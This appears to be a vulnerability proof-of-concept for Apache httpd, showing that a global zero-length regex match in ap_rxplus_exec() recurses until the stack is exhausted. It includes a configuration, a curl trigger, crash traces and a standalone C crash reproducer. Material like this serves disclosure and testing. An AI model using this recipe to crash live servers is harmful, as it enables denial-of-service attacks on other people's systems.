# PoC 203 - Global Zero-Length Match Recurses Forever

`ap_rxplus_exec()` recurses on `remainder` for every global match. When the
regex matches an empty string, `remainder` does not advance, producing
unbounded recursion and stack exhaustion.

## Setup

httpd with `mod_headers` (or any `ap_rxplus_*` consumer that exposes the `g`
flag through configuration). Default ulimit -s.

`/tmp/httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mpm_event_module      modules/mod_mpm_event.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule mime_module           modules/mod_mime.so
LoadModule headers_module        modules/mod_headers.so
LoadModule dir_module            modules/mod_dir.so

DocumentRoot "/tmp/htdocs"

# 'g' sets AP_REG_MULTI; '^' matches a zero-length string at offset 0.
# Each recursive call sees the same input and recurses again.
Header always edit Server "s/^/X/g"

<Directory "/tmp/htdocs">
    Require all granted
</Directory>
```

```sh
mkdir -p /tmp/htdocs
echo "ok" > /tmp/htdocs/index.html
httpd -DFOREGROUND -f /tmp/httpd.conf &
```

## Trigger

```sh
curl -sv http://127.0.0.1:8080/index.html >/dev/null
```

Any response with a `Server` header matches the zero-length `^` and enters
the recursive `ap_rxplus_exec()` global path.

## Observed effect

- Worker stack overflow leading to SIGSEGV. The crash address is the bottom
  of the thread stack, with thousands of `ap_rxplus_exec` frames on the
  call stack:

  ```
  ==pid==ERROR: AddressSanitizer: stack-overflow on address 0x...
      #0 ap_rxplus_exec server/util_regex.c:174
      #1 ap_rxplus_exec server/util_regex.c:174
      ... (thousands of identical frames)
  ```

- Without ASan: `child pid ... exit signal Segmentation fault (11)` on every
  matching request, with `gdb` showing an unbounded recursion of
  `ap_rxplus_exec` frames in the backtrace.
- Reachable from any unauthenticated request whose response carries a
  matching header, which makes this a deterministic remote DoS.

Standalone reproduction without httpd:

```sh
cat > /tmp/zero.c <<'EOF'
#include <stdio.h>
#include "apr_pools.h"
#include "ap_regex.h"
#include "util_regex.h"
int main(void){
    apr_pool_t *p; apr_initialize(); apr_pool_create(&p, NULL);
    ap_rxplus_t *rx = ap_rxplus_compile(p, "s/^/X/g");
    char *out = NULL;
    ap_rxplus_exec(p, rx, "abc", &out);   /* recurses until SIGSEGV */
    return 0;
}
EOF
```

Build against the httpd tree and run; the binary segfaults from stack
exhaustion within milliseconds.
